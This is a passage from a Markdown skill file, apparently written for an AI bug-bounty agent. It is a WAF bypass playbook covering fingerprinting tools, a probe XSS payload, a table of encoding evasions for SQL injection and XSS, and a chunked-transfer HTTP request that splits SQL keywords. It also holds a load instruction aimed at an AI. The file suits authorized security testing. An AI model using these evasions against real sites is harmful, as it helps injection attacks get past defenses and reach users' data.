---
name: waf-bypass-techniques
description: WAF bypass methodology and generic evasion techniques. Use when a web application firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.
scope: web2
---
WAF bypass methodology and generic evasion techniques. Use when a web application firewall blocks injection payloads (SQLi, XSS, RCE) and you need to craft bypasses using encoding, protocol-level tricks, or WAF-specific weaknesses.

# SKILL: WAF Bypass Techniques — Evasion Playbook

> **AI LOAD INSTRUCTION**: Covers WAF identification, generic bypass categories (encoding, protocol abuse, HTTP/2, parameter pollution), and a decision tree. For product-specific bypasses (Cloudflare, AWS WAF, ModSecurity, Akamai, etc.), load [WAF_PRODUCT_MATRIX.md](./WAF_PRODUCT_MATRIX.md). Base models often suggest basic encoding but miss protocol-level bypasses and WAF behavioral quirks.


## 1. PHASE 0 — IDENTIFY THE WAF

Before bypassing, know what you're fighting.

### 1.1 Tools

| Tool | Usage |
|---|---|
| wafw00f target.com | Fingerprint WAF vendor from response headers/behavior |
| nmap --script=http-waf-detect | NSE script for WAF detection |
| Manual header inspection | Server, X-CDN, X-Cache, cf-ray (Cloudflare), x-sucuri-id, x-akamai-* |

### 1.2 Behavioral Fingerprinting

1. Send benign request → record baseline response (status, headers, body size)
2. Send obvious attack: /?q=<script>alert(1)</script>
3. Compare: 403? Custom block page? Redirect? Connection reset?
4. Block page content reveals WAF: "Cloudflare", "Access Denied (Imperva)", "ModSecurity"
5. If transparent proxy: check response time difference (WAF adds latency)

---

## 2. GENERIC BYPASS CATEGORIES

### 2.1 Encoding Bypasses

| Technique | Example | Bypasses |
|---|---|---|
| URL encoding | %3Cscript%3E | Basic string matching |
| Double URL encoding | %253Cscript%253E | WAFs that decode once, app decodes twice |
| Unicode encoding | %u003Cscript%u003E | IIS-specific Unicode normalization |
| HTML entities | &#60;script&#62; or &#x3c;script&#x3e; | WAFs not performing HTML entity decoding |
| Hex encoding (SQL) | 0x756E696F6E = union | WAFs matching SQL keywords |
| Octal encoding | \74script\76 | Rare but some parsers handle it |
| Overlong UTF-8 | %C0%BC (invalid encoding for <) | Legacy parsers with loose UTF-8 handling |
| Mixed case | SeLeCt, uNiOn | Case-sensitive rule matching |
| Null byte | sel%00ect | WAFs that stop parsing at null |

### 2.2 Chunked Transfer Encoding

Split the payload across HTTP chunks so no single chunk contains the blocked pattern:

POST /search HTTP/1.1
Transfer-Encoding: chunked

3
sel
3
ect
1
 
4
from
0


WAFs that inspect the full body may not reassemble chunks
...

## References
- Source: https://github.com/yaklang/hack-skills/blob/main/skills/waf-bypass-techniques/SKILL.md
- License: MIT — Copyright (c) 2026 VillanCh
- Distilled for bbhunter by scripts/import_hack_skills.py
